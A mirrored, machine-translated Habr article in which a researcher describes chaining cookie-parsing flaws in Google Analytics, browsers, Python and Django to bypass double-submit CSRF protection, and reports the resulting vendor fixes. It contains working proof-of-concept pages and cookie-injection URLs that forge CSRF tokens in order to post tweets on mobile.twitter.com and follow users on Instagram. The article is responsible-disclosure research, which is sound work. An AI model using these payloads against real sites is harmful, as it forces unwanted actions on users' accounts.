<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Not all cookies are equally useful.</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In this article I would like to talk about how you can combine small flaws in the processing of cookie-values ‚Äã‚Äãin a chain, and to make at the expense...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Not all cookies are equally useful.</h1><div class="post__text post__text-html js-mediator-article"> In this article I would like to talk about how you can combine small flaws in the processing of cookie-values ‚Äã‚Äãin a chain, and to make at the expense of this attack on users of popular web applications. <br><img src="https://habrastorage.org/getpro/habr/post_images/8c5/51b/d1d/8c551bd1de92be5e0d526a22355c0bc9.png" alt="image"><br><a name="habracut"></a><br><br>  The story began over a year ago when I tested the DOMinator program for searching for DOM-Based XSS on Bug Bounty program sites.  One of the first warnings I received was a cookie injection vulnerability in JavaScript analytics Google Analytics. <br><br>  When accessing a site with Google Analytics, the script processes the HTTP value of the Referer header and extracts the host and the path to the script from it to track where the user came from.  In the future, this data gets into the cookie parameter <code>__utmz</code> . 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      It looks like this: <br> <code>__utmz=123.123.11.2.utmcsr=[HOST]|utmccn=(referral)|utmcmd=referral|utmcct=[PATH]</code> <br> <br>  By changing the script path on your site from which the user navigates to the site with Google Analytics, you can influence the end of the <code>__utmz</code> cookie value and try to change the cookie attributes, since the path is not processed before it hits the value.  However, attributes will be overwritten by subsequent values ‚Äã‚Äãthat Google Analytics substitutes. <br><br> <code><a href="http"></a> blackfan.ru/x/injection;injection=injection?r=http://site.com/</code> <br> <br>  Result: <br> <code>document.cookie=__utmz=blah...|utmcct=/x/injection;injection=injection; path=/; domain=.site.com</code> <br> <br>  At the moment, it was difficult to call it a vulnerability, but nevertheless, the behavior of the script is quite interesting, besides, it is incredibly common. <br><br><h4>  Bug Bounty and Cookie </h4><br>  A small digression.  Cookie vulnerabilities in vulnerability rewards programs are notable in that you might have two main scenarios: <br><br><ul><li>  Found the ability to overwrite and create arbitrary cookie settings. <br>  Answer: This is just a cookie, what will it give you? <br></li><li>  Found XSS via cookie parameter. <br>  Answer: You cannot create an arbitrary cookie parameter, it means that this is not a vulnerability! <br></li></ul><br>  And only if both options were in the same Bug Bounty program, then you, so be it, will be paid. <br><br>  The need to prove each time the threat from cookies is often discourages people from finding them.  As for the time spent on this, you can find a dozen more vulnerabilities that will be taken without question.  Basically, only the most basic things are checked, such as session fixing and the correctness of the secure attributes set, httpOnly ... <br><br><h4>  Cookie </h4><br>  Take a look at the structure of the cookie headers: <br><br> <code>Set-Cookie: par=val; path=/; httpOnly; secure;</code> <br> <code>Cookie: par=val; par2="val2"; par3=val3;</code> <br> <br>  The structure is quite complex and the browser, JavaScript scripts and the web server work with it every time you request.  Each handles it in its own way, and the same line can produce different results. <br><br>  Analyzing the processing of cookies, you must ask the following questions: <br><br><ol><li>  Do you need spaces after; </li><li>  What characters can be used instead; </li><li>  What value will result in the case of identical keys </li><li>  Is the key case important? </li><li>  How many attributes can a parameter have </li><li>  What value will be the result in case of identical attributes? </li><li>  How to encode special characters </li></ol><br><h4>  Cookie handling </h4><br>  The first and most famous feature - Safari allows you to declare several parameters through a single Set-Cookie header. <br><br> <code>Set-Cookie: param1=value1; path=/, param2=value2; httpOnly;</code> <br> <br>  Returning to the problem of Google Analytics, let's check this feature in setting cookies through JavaScript.  We get the first version of operation: <br><br> <code><a href="http://blackfan.ru/x/injection%3B"></a> blackfan.ru/x/injection;,injection_cookie=injection;?r=http://site.com/</code> <br> <br>  Result <br> <code>document.cookie=__utmz=blah...|utmcct=/r/injection;,injection_cookie=injection; path=/; domain=.site.com</code> <br> <br>  Safari will create two cookie parameters <code>__utmz</code> and <code>injection_cookie</code> . <br><br>  That is, for a Safari user on any site with Google Analytics, you can create an arbitrary cookie setting.  It remains only to think of why ... <br><br><h4>  CSRF </h4><br>  Protection against CSRF can be divided into 3 types: <br><ol><li>  Different tokens for each action.  Stored on server. </li><li>  One session token for all actions.  Stored on the server in a user session. </li><li>  One session token for all actions.  Stored in the cookie parameter. </li></ol><br>  The third option is based on the fact that the value of the token in the user's cookie is not accessible to the attacker.  To pass the test, simply send the same token value in the cookie and post parameters.  That is, a simple rewriting of the value through Google Analytics is perfect here. <br><br><h4>  Cookie handling features # 2 </h4><br>  What if you deploy an attack at 180 degrees?  It is not necessary that the browser actually had a cookie parameter with a CSRF token, the value of which we know.  Enough to think so web server. <br><br>  This will help another discovered cookie processing feature. <br><br><blockquote>  <a href="https://www.ietf.org/rfc/rfc2109.txt">RFC2109</a> <br>  Note: For backward compatibility, the separator in the cookie header <br>  is semi-colon (;) everywhere.  A server should also accept comma (,) <br>  as the separator between cookie-values ‚Äã‚Äãfor future compatibility. </blockquote><br>  Many web servers support cookies not only through a semicolon, but also separated by a comma. <br><br> <code>Cookie: par=val; par2="val2"; par3=val3;</code> <br> <code>Cookie: par=val, par2="val2", par3=val3,</code> <br> <br>  Moreover, in some cases, the space is not required. <br><br> <code>Cookie: par=val;par2="val2";par3=val3;</code> <br> <code>Cookie: par=val,par2="val2",par3=val3,</code> <br> <br>  In turn, for most browsers, characters such as space and comma are quite normal.  And if you install: <br><br> <code>Set-Cookie: par=val, csrftoken=val2;</code> <br> <code>document.cookie="par=val, csrftoken=val2;";</code> <br> <br>  For the browser, this will be one value, but for some server implementations, two cookie parameters.  However, in the case of using these features to bypass the CSRF protection, it is necessary to remember that we do not overwrite the old token, but add another one, that is, the order of processing cookies is important. <br><br> <code>Cookie: csrftoken=realvalue; par=val, csrftoken=fakevalue;</code> <br> <br>  In total, there are already two chains of exploitation of vulnerability: <br><br> <code>Safari -&gt; WebApp (GA &amp; Double Submit Cookies)</code> <br> <br> <code>  -&gt; WebApp (GA &amp; Double Submit Cookies &amp; ,   cookie)</code> <br> <br><h4>  Exploitation </h4><br>  After preparing a good base, you need to check in real conditions.  Almost immediately, the ideal option is <code>mobile.twitter.com</code> . <br><br>  It implements CSRF cookie-based protection, the server supports a comma-separated cookie without a space, but ... It does not have Google Analytics.  But he is on <code>translate.twitter.com</code> !  It's time to check the processing of cookie attribute values, or more precisely, to check the possibility of discarding path and domain values ‚Äã‚Äãadded at the end if an injection occurs in the cookie value. <br><br>  It turned out that Google Chrome, in the case of a large number of cookie attributes, at some point simply ceases to parse them and does not reach the last valid values. <br><br>  That is, in this case: <br><br> <code>Set-Cookie: test=test; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; [...]; domain=blah.blah.blah.google.com;</code> <br> <br>  The cookie will be installed on <code>.google.com</code> , not <code>blah.blah.blah.google.com</code> . <br><br>  Thus, one more operation chain is added: <br><br> <code>Chrome -&gt; WebApp 1 (Double Submit Cookies &amp; ,   cookie) &amp; WebApp 2 (GA)</code> <br> <br>  Form PoC: <br><br><pre> <code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">style</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"display:none;"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"csrf"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">action</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://mobile.twitter.com/api/tweet"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">method</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"POST"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"tweet[text]"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"PoC"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"m5_csrf_tkn"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"x"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"submit"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Submit request"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="actionscript"><span class="actionscript"> </span><span class="hljs-function"><span class="hljs-keyword"><span class="actionscript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="actionscript"><span class="hljs-function"> </span></span><span class="hljs-title"><span class="actionscript"><span class="hljs-function"><span class="hljs-title">xxx</span></span></span></span><span class="hljs-params"><span class="actionscript"><span class="hljs-function"><span class="hljs-params">()</span></span></span></span><span class="actionscript"><span class="hljs-function"> </span></span></span><span class="actionscript">{ setTimeout(</span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">"document.getElementById('csrf').submit();"</span></span></span><span class="actionscript">,</span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">5000</span></span></span><span class="actionscript">); } </span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">a</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">target</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"_blank"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">href</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://blackfan.ru/x/,m5_csrf_tkn=x,;domain=.twitter.com;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;?r=http://translate.twitter.com/"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">onclick</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"xxx()"</span></span></span><span class="hljs-tag">&gt;</span></span> Tweet "PoC" <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">a</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  Description: <br><ol><li>  User is logged in to <code>twitter.com</code> </li><li>  Mobile version of <code>mobile.twitter.com</code> picks up the session of the main site even if the user did not visit it </li><li>  We assume that the user was not on <code>translate.twitter.com</code> and does not have the cookie <code>__utmz</code> on it </li><li>  We transfer the Referer with the path that contains the injection into the cookie to the site <code>translate.twitter.com</code> </li><li>  Google Analytics creates cookies <code>__utmz=blah...|,m5_csrf_tkn=x,</code> </li><li>  Due to the large number of attributes, Chrome overwrites the domain on <code>.twitter.com</code> </li><li>  We are waiting for the end of the request processing and send another request to create a tweet ‚ÄúPoC‚Äù using the token ‚Äúx‚Äù </li><li>  In accordance with the order of the sent cookie, <code>mobile.twitter.com</code> takes our value of the token "x" and makes sure that the value in the post request and in the cookie are the same </li><li>  User has PoC tweet </li></ol><br><h4>  Cookie handling features # 3 </h4><br>  The next goal was <code>instagram.com</code> , or rather all the sites on Django.  CSRF protection in Django is also cookie-based.  To successfully pass the scan, it is enough to send the same values ‚Äã‚Äãin the <code>csrftoken</code> cookie and the post parameter to <code>csrfmiddlewaretoken</code> , or in the HTTP header <code>X-CSRFToken</code> .  However, there is an additional check that may further hinder.  If the site is working over HTTPS, Django checks the Referer header and, in case of a mismatch, blocks the request, even if it contains the correct token.  Post requests without Referer are also blocked. <br><br>  During the study of the processing of cookies in Django, the following features were discovered: <br><br><ol><li>  It is not necessary to use a semicolon as a separator; any whitespace character between the parameters is sufficient. <br> <code>Cookie: test=test test2=test2</code> </li> <li>  If the cookie value is <code>[ \ ]</code> , then the first part of the cookie is discarded. <br>  <code>Cookie: test=test]test2=test2</code> . <br>  As a result, only <code>test2</code> . </li></ol><br>  It turned out that this problem is not even in Django, but in Python.  The cookie library processes values ‚Äã‚Äãin accordance with <a href="http://tools.ietf.org/html/rfc2109.html">RFC2109</a> .  And it turns out that the use of <code>[ \ ]</code> characters is not provided if the value is not framed with double quotes.  For browsers, the use of these symbols is quite normal. <br><br>  PoC for instagram is almost identical to the previous one: <br><br><pre> <code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">action</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://instagram.com/web/friendships/[user_id]/follow/?ref=emptyfeed"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"csrf"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">method</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"POST"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"csrfmiddlewaretoken"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"x"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"submit"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Submit request"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="javascript"><span class="javascript"> </span><span class="hljs-function"><span class="hljs-keyword"><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="javascript"><span class="hljs-function"> </span></span><span class="hljs-title"><span class="javascript"><span class="hljs-function"><span class="hljs-title">xxx</span></span></span></span><span class="javascript"><span class="hljs-function">(</span></span><span class="hljs-params"></span><span class="javascript"><span class="hljs-function"><span class="hljs-params"></span>) </span></span></span><span class="javascript">{ </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">document</span></span></span><span class="javascript">.getElementById(</span><span class="hljs-string"><span class="javascript"><span class="hljs-string">'csrf'</span></span></span><span class="javascript">).submit(); } </span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://blackfan.ru/x/]csrftoken=x,;domain=.instagram.com;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;?r=http://blog.instagram.com/"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">onload</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"xxx()"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  Blog.instagram.com is used for forwarding cookies <code>__utmz</code> , and / <code>/r/]csrftoken=x,;domain=.instagram.com;</code>  . <br><br><h4>  Cookie handling features # 4 </h4><br>  After talking with Google, Twitter, Facebook, Django and Python, I again decided to try to get around their fixes. <br><br>  The following condition changes have occurred: <br><ol><li>  Google Analytics began dropping the part after the semicolon and forcing to replace the space with% 20 </li><li>  Python fixed incorrect processing <code>[ \ ]</code> </li></ol><br>  However, there was still the possibility of enumerating cookies through whitespace in Django, which was greatly hampered by the replacement used by Google. <br><br>  The whitespace check showed the following: <br><ol><li>  Internet Explorer replaces \ x09 \ x0b \ x0c with _ </li><li>  Chrome does not set a cookie if it contains \ x09 \ x0b \ x0c characters </li><li>  FireFox considers these characters normal </li></ol><br>  As a result, the following version of operation for FireFox is obtained <br><br> <code><a href="https://instagram.com/%3Futm_source%3D1%26utm_medium%3D2%26utm_campaign%3D3%26utm_term%3D4%26utm_content%3D5%2509csrftoken%253Dx"></a> instagram.com/?utm_source=1&amp;utm_medium=2&amp;utm_campaign=3&amp;utm_term=4&amp;utm_content=5%09csrftoken%3dx</code> <br> <br><h4>  Cookie handling features # 5 </h4><br>  I also found another interesting option in some server implementations, but so far I have not found a use in real conditions.  When using special characters in cookies, the value is framed in double quotes.  This behavior can be used as follows: <br><br> <code>Set-Cookie: test="test</code> <br> <code>Set-Cookie: foo=bar</code> <br> <code>Set-Cookie: test2="</code> <br> <br>  For browsers, double quotes are not some special character and as a result you will get the following title: <br><br> <code>Cookie: test="test; foo=bar; test2="</code> <br> <br>  But some web servers can process these values ‚Äã‚Äãas one test parameter, as a result of which the <code>foo=bar</code> parameter will not be created.  With the coincidence of an incredible amount of conditions, this feature can also be used. <br><br><h4>  results </h4><br><h5>  Operating options </h5><br> <code>Safari -&gt; WebApp (GA &amp; Double Submit Cookies)</code> <br> <code>  -&gt; WebApp (GA &amp; Double Submit Cookies &amp; ,   cookie)</code> <br> <code>Chrome -&gt; WebApp 1 (Double Submit Cookies &amp; ,   cookie) &amp; WebApp 2 (GA)</code> <br> <code>FireFox -&gt; WebApp (GA &amp; Double Submit Cookies &amp;  ,   cookie)</code> <br> <br><h5>  Fixes </h5><br><ol><li>  Google Analytics added% 20 blank space for cookies (dubious improvement) <br></li><li>  Google Analytics fixed the ability to change cookie attributes by dropping everything that comes after the ";" <br></li><li>  Google Chrome will NOT correct overwriting using a large number of attributes, since the client should not be able to set arbitrary attributes initially. <br></li><li>  Python fixed a problem with characters <code>[ \ ]</code> ( <a href="https://hg.python.org/cpython/rev/270f61ec1157">https://hg.python.org/cpython/rev/270f61ec1157</a> ) <br></li><li>  Twitter changed the type of CSRF protection on <code>mobile.twitter.com</code> <br></li></ol><br>  When dealing with Google, I was faced with a total lack of understanding of the essence of the vulnerability.  They demanded an example from me on Google sites, which I did not have, and they were not at all interested that Google Analytics could be a threat on other sites.  And only after a dozen letters did my report get to Krzysztof (apparently, it was <a href="https://twitter.com/kkotowicz">@kkotowicz</a> ), who figured out what was happening and conveyed the information to the appropriate developers. </div><p>Source: <a href="https://habr.com/ru/post/272187/">https://habr.com/ru/post/272187/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../272177/index.html">Business processes: how not to automate mess</a></li>
<li><a href="../272179/index.html">Rational approximation to pi</a></li>
<li><a href="../272181/index.html">Mail.Ru Group educational projects: 4 years, 1206 students, 101 teachers</a></li>
<li><a href="../272183/index.html">Cisco IOS shellcode: All-in-one</a></li>
<li><a href="../272185/index.html">Announcement of laboratory works with Windows Camp // Labs and useful links for developers</a></li>
<li><a href="../272189/index.html">Feature javascript protocol or generation of random password in the browser tab</a></li>
<li><a href="../272191/index.html">Welcome to TechDay in Moscow on December 10</a></li>
<li><a href="../272193/index.html">How to calculate the time for testing</a></li>
<li><a href="../272195/index.html">A couple of words about the "death" of Flash, Animate CC and Web standards</a></li>
<li><a href="../272197/index.html">Release close ...</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>